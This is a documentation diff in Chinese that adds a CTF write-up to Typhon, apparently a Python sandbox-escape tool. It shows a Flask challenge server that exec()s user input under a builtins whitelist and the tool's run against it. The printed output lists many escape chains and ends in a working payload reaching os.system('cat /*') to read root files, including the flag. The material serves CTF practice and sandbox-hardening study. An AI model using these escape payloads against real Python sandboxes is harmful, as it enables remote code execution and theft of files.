@@ -377,3 +377,160 @@ Typhon-Sample Pyjail 1
     +++++++++++Jail broken+++++++++++
 
 根据 ``reminder`` 信息稍微调整payload即可得到flag。
+
+0xgame 2025 消栈逃出沙箱(1)反正不会有2
+----------------------------------------------------------------
+
+感谢 `Pure Stream <https://marblue.pink/>`_ 对题的授权。
+
+题目源码：
+
+.. code-block:: python
+    :lineno:
+
+    from flask import Flask, request, Response
+    import sys
+    import io
+
+    app = Flask(__name__)
+
+    blackchar = "&*^%#${}@!~`·/<>"
+
+    def safe_sandbox_Exec(code):
+        whitelist = {
+            "print": print,
+            "list": list,
+            "len": len,
+            "Exception": Exception
+        }
+
+        safe_globals = {"__builtins__": whitelist}
+
+        original_stdout = sys.stdout
+        original_stderr = sys.stderr
+
+        sys.stdout = io.StringIO()
+        sys.stderr = io.StringIO()
+        
+        try:
+            exec(code, safe_globals)
+            output = sys.stdout.getvalue()
+            error = sys.stderr.getvalue()
+            return output or error or "No output"
+        except Exception as e:
+            return f"Error: {e}"
+        finally:
+            sys.stdout = original_stdout
+            sys.stderr = original_stderr
+
+    @app.route('/')
+    def index():
+        return open(__file__).read()
+
+
+    @app.route('/check', methods=['POST'])
+    def check():
+        data = request.form['data']
+        if not data:
+            return Response("NO data", status=400)
+        for d in blackchar:
+            if d in data:
+                return Response("NONONO", status=400)
+        secret = safe_sandbox_Exec(data)
+        return Response(secret, status=200)
+
+    if __name__ == '__main__':
+        app.run(host='0.0.0.0',port=9000)
+
+这是一个由 `Flask <https://flask.org.cn/en/stable/>`_ 框架构建的含有 pyjail 挑战的 web 服务器。我们不难注意，此题目唯一的 waf 是其对命名空间的限制：
+
+.. code-block:: python
+    :linenos:
+
+        whitelist = {
+            "print": print,
+            "list": list,
+            "len": len,
+            "Exception": Exception
+        }
+
+        safe_globals = {"__builtins__": whitelist}
+
+由于这是一道web题目，我们不能控制程序的 stdin （即，类似于 ``input()`` , ``help()`` 的函数）。因此，我们将 :attr:`~bypassRCE.interactive` 设置为 ``False``
+
+.. code-block:: python
+    :linenos:
+
+    import Typhon
+
+    Typhon.bypassRCE(
+        "cat /*",
+        local_scope={
+            "__builtins__": {
+                "print": print,
+                "list": list,
+                "len": len,
+                "Exception": Exception,
+            }
+        },
+        interactive=False,
+    )
+
+运行，我们可得：
+
+.. code-block::
+    :emphasize-lines: 42
+
+    -----------Progress-----------
+
+
+    directly input bypass(0 payload found): None
+    generator(3 payloads found): (a for a in ()).gi_frame
+    type(2 payloads found): list.__class__
+    object(6 payloads found): {}.__class__.__mro__[1]
+    bytes(3 payloads found): list.__class__(''.encode())
+    builtins set(5 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']
+    builtins module(0 payload found): None
+    import(6 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']
+    load_module(6 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__loader__'].load_module
+    modules(1 payload found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('sys').modules
+    os(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os')
+    subprocess(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('subprocess')
+    uuid(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('uuid')
+    pydoc(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('pydoc')
+    multiprocessing(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('multiprocessing')
+    builtins(4 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('builtins')
+    codecs(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('codecs')
+    warnings(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('warnings')
+    base64(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('base64')
+    importlib(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('importlib')
+    weakref(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('weakref')
+    reprlib(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('reprlib')
+    sys(4 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('sys')
+    linecache(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('linecache')
+    io(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('io')
+    ctypes(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('ctypes')
+    profile(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('profile')
+    timeit(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('timeit')
+    exec(32 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('profile').run
+    __import__2RCE(20 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('cat /*')
+
+
+    -----------Progress-----------
+
+
+    +++++++++++Jail broken+++++++++++
+
+
+    {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('cat /*')
+
+
+    +++++++++++Jail broken+++++++++++
+
+使用上述 payload 读取根目录下所有文件（包含 ``/flag`` ）。
+
+.. note::
+
+    此题的预期解法为利用 ``Exception`` 的 ``__traceback__`` 获取生成器通过栈帧寻找 ``__builtins__``。这涉及到多行绕过。
+
+    Typhon目前还不支持此类题解，类似的解法将在下一个版本中得到实现。
